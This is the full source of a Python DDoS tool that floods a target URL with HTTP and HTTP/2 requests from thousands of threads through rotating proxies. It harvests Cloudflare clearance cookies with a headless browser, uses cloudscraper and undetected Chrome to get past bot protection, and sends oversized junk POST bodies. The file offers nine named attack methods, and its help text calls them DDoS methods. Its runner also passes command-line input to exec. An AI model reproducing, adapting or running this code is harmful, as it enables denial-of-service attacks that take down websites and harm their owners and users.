import httpx, threading, cloudscraper, requests
import argparse
import undetected_chromedriver as uc
import random, datetime, time
import hashlib
import base64
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from fake_useragent import UserAgent
from requests.cookies import RequestsCookieJar

def random_data():
    random_payload = [
        {
            'A': base64.b64encode(
                    hashlib.sha256(('AAAAAAAAAAAAAAAAAAAAA' + str(random.randint(6000, 12000))).encode()).digest()
                ).decode() * 16384,
        },
        {
            'B': base64.b64encode(
                    hashlib.sha256(('BBBBBBBBBBBBBBBBBBBBB' + str(random.randint(6000, 12000))).encode()).digest()
                ).decode() * 16384,
        },
        {
            'C': base64.b64encode(
                    hashlib.sha256(('CCCCCCCCCCCCCCCCCCCCC' + str(random.randint(6000, 12000))).encode()).digest()
                ).decode() * 16384,
        }
    ]

    return random.choice(random_payload)

def random_headers():
    headers_list = [
        {
            'User-Agent': UserAgent().chrome,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary',
            'Content-Length': '500000000',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
        },
        {
            'User-Agent': UserAgent().chrome,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary',
            'Content-Length': '500000000',
        },
        {
            'User-Agent': UserAgent().chrome,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary',
            'Content-Length': '500000000',
            'Upgrade-Insecure-Requests': '200',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        }
    ]

    return random.choice(headers_list)

def get_cookie(url):
    global useragent, cookieJAR, cookie
    options = webdriver.ChromeOptions()
    arguments = [
    '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging', '--disable-login-animations',
    '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
    '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en' 
    ]
    for argument in arguments:
        options.add_argument(argument)
    driver = webdriver.Chrome(options=options)
    driver.implicitly_wait(3)
    driver.get(url)
    for _ in range(60):
        cookies = driver.get_cookies()
        tryy = 0
        for i in cookies:
            if i['name'] == 'cf_clearance':
                cookieJAR = driver.get_cookies()[tryy]
                useragent = driver.execute_script("return navigator.userAgent")
                cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                driver.quit()
                return True
            else:
                tryy += 1
                pass
        time.sleep(1)
    driver.quit()
    return False

class Method:
    class PXHTTP2:
        def __init__(self, url, thread, time, proxy):
            self.proxy = proxy
            self.url = url
            self.thread = thread
            self.time = time
        def Attack(self):
            headers = {
                'User-Agent': UserAgent().chrome,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'TE': 'trailers',
                }
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            for _ in range(int(self.thread)):
                threading.Thread(target=self.AttackPXHTTP2, args=(until, headers)).start()
        def AttackPXHTTP2(self, until_datetime, headers):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    self.proxies = random.choice(open(self.proxy, 'r').readlines())
                    self.launcher = httpx.Client(
                        http2=True,
                        proxies={
                            'http://': 'http://'+self.proxies,
                            'https://': 'http://'+self.proxies,
                        }
                    )
                    self.launcher.get(self.url, headers=headers)
                    self.launcher.get(self.url, headers=headers)
                except:
                    pass
        def start(self):
            return self.Attack()

    class HTTP2:
        def __init__(self, url, thread, time):
            self.url = url
            self.thread = thread
            self.time = time
        def Attack(self):
            headers = {
                'User-Agent': UserAgent().chrome,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'TE': 'trailers',
                }
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            for _ in range(int(self.thread)):
                threading.Thread(target=self.AttackHTTP2, args=(until, headers)).start()
        def AttackHTTP2(self, until_datetime, headers):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    self.launcher = httpx.Client(http2=True)
                    self.launcher.get(self.url, headers=headers)
                    self.launcher.get(self.url, headers=headers)
                except:
                    pass
        def start(self):
            return self.Attack()

    class PXCFB:
        def __init__(self, url, thread, time, proxy):
            self.proxy = proxy
            self.url = url
            self.thread = thread
            self.time = time
            self.scraper = cloudscraper.create_scraper()
        def Attack(self):
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            for _ in range(int(self.thread)):
                threading.Thread(target=self.AttackPXCFB, args=(until)).start()
        def AttackPXCFB(self, until_datetime):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    proxy = {
                            'http': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
                            'https': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
                    }
                    self.scraper.get(self.url, proxies=proxy)
                    self.scraper.get(self.url, proxies=proxy)
                except:
                    pass
        def start(self):
            return self.Attack()

    class PXREQ:
        def __init__(self, url, thread, time, proxy):
            self.proxy = proxy
            self.url = url
            self.thread = thread
            self.time = time
        def Attack(self):
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            for _ in range(int(self.thread)):
                threading.Thread(target=self.AttackPXREQ, args=(self.url, until)).start()
        def AttackPXREQ(self, url, until_datetime):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    proxy = {
                            'http': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
                            'https': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
                    }
                    requests.get(url, proxies=proxy)
                    requests.get(url, proxies=proxy)
                except:
                    pass
        def start(self):
            return self.Attack()

    class PXBYP:
        def __init__(self, url, thread, time, proxy):
            self.proxy = proxy
            self.url = url
            self.thread = thread
            self.time = time
            self.scraper = cloudscraper.create_scraper(disableCloudflareV1=True)
        def Attack(self):
            headers = {
                'User-Agent': UserAgent().chrome,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'TE': 'trailers',
            }
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            for _ in range(int(self.thread)):
                threading.Thread(target=self.AttackBYP, args=(self.url, until, headers)).start()
        def AttackBYP(self, url, until_datetime, headers):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    proxy = {
                            'http': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
                            'https': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
                    }
                    requests.get(url, proxies=proxy, verify=False)
                    self.scraper.get(url, proxies=proxy, verify=False)
                    self.launcher = httpx.Client(
                        http2=True,
                        proxies={
                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                        }
                    )
                    self.launcher.get(url, headers=headers)
                except:
                    pass
        def start(self):
            return self.Attack()

    class PXROCKET:
        def __init__(self, url, thread, time, proxy):
            self.proxy = proxy
            self.url = url
            self.thread = thread
            self.time = time

        # Memulai thread untuk melakukan attack
        def Attack(self):
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            threads = []
            for _ in range(self.thread):
                thread = threading.Thread(target=self.PXROCKET, args=(self.url, until))
                thread.start()
                threads.append(thread)

            for thread in threads:
                thread.join()

        def PXROCKET(self, url, until_datetime):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    options = webdriver.ChromeOptions()
                    options.add_argument(f"--proxy-server={random.choice(open(self.proxy, 'r').readlines())}")  # Tambahkan proxy
                    options.headless = True
                    driver = uc.Chrome(options=options)
                    driver.get(url)
                except:
                    pass

        def start(self):
            return self.Attack()

    class PXMIX:
        def __init__(self, url, thread, time, proxy):
            self.proxy = proxy
            self.url = url
            self.thread = thread
            self.time = time
            self.scraper = cloudscraper.create_scraper(disableCloudflareV1=True, browser='chrome', delay=6, captcha={'provider': 'return_response'})

        # Memulai thread untuk melakukan attack
        def Attack(self):
            headers = {
                'User-Agent': UserAgent().chrome,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'TE': 'trailers',
            }
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            threads = []
            for _ in range(self.thread):
                thread = threading.Thread(target=self.PXMIX, args=(self.url, until, headers))
                thread.start()
                threads.append(thread)

            for thread in threads:
                thread.join()

        def PXMIX(self, url, until_datetime, headers):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    requests.get(url, proxies={
                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                        }, headers=headers)
                    self.scraper.get(url, proxies={
                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                        }, headers=headers)
                    self.launcher = httpx.Client(
                        http2=True,
                        proxies={
                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                        }
                    )
                    self.launcher.get(self.url, headers=headers)
                except:
                    pass

        def start(self):
            return self.Attack()

    class PXCFPRO:
        def __init__(self, url, thread, time, proxy):
            self.proxy = proxy
            self.url = url
            self.thread = thread
            self.time = time
            self.session = requests.Session()
            self.scraper = cloudscraper.create_scraper(disableCloudflareV1=True, sess=self.session, browser='chrome')
            jar = RequestsCookieJar()
            jar.set(cookieJAR['name'], cookieJAR['value'])
            self.scraper.cookies = jar

        # Memulai thread untuk melakukan attack
        def Attack(self):
            headers = {
                'User-Agent': UserAgent().chrome,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'TE': 'trailers',
            }
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            threads = []
            for _ in range(self.thread):
                thread = threading.Thread(target=self.PXCFPRO, args=(self.url, until, headers))
                thread.start()
                threads.append(thread)

            for thread in threads:
                thread.join()

        def PXCFPRO(self, url, until_datetime, headers):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    self.scraper.get(url, headers=headers)
                    self.scraper.get(url, headers=headers)
                except:
                    pass

        def start(self):
            return self.Attack()

    class PXKILL:
        def __init__(self, url, thread, time, proxy):
            self.proxy = proxy
            self.url = url
            self.thread = thread
            self.time = time
            self.scraper = cloudscraper.create_scraper()

        # Memulai thread untuk melakukan attack
        def Attack(self):
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            threads = []
            for _ in range(self.thread):
                thread = threading.Thread(target=self.PXKILL, args=(self.url, until))
                thread.start()
                threads.append(thread)

            for thread in threads:
                thread.join()

        def PXKILL(self, url, until_datetime):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                headers = random_headers()
                payload = random_data()
                try:
                    self.scraper.post(url, headers=headers, data=payload, proxies={
                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                        })
                    requests.post(url, headers=headers, data=payload, proxies={
                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                        })
                except:
                    pass

        def start(self):
            return self.Attack()

class Runner:
    def __init__(self, args):
        self.args = args
    def start():
        with ThreadPoolExecutor(max_workers=int(args.tpe)) as executor:
            for _ in range(int(args.tpe)):
                if 'PX' in str(args.method).upper():
                    exec(f'executor.submit(Method.{str(args.method).upper()}("{args.url}", {args.thread}, {args.time}, "{args.proxy}").start())')
                else:
                    exec(f'executor.submit(Method.{str(args.method).upper()}("{args.url}", {args.thread}, {args.time}).start())')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=f'Usage: python3 {__file__} [OPTIONS]')
    parser.add_argument('-u', '--url', type=str, help='Target URL', required=True, metavar='https://example.com')
    parser.add_argument('-th', '--thread', type=str, help='Threader', metavar='20000', default=20000)
    parser.add_argument('-t', '--time',type=str, help='DDoS Duration', metavar='45', default=45)
    parser.add_argument('-p', '--proxy', type=str, help='Proxy addrress', metavar='proxy.txt')
    parser.add_argument('-tpe', '--tpe', type=str, help='ThreadPoolExecutor', metavar='150-300', default=150)
    parser.add_argument('-m', '--method', type=str, help='DDoS Method', metavar='PXHTTP2, HTTP2, PXCFB, PXREQ, PXBYP, PXROCKET, PXMIX, PXCFPRO, PXKILL', required=True)
    args = parser.parse_args()
    get_cookie(str(args.url))
    threading.Thread(target=Runner.start()).start()
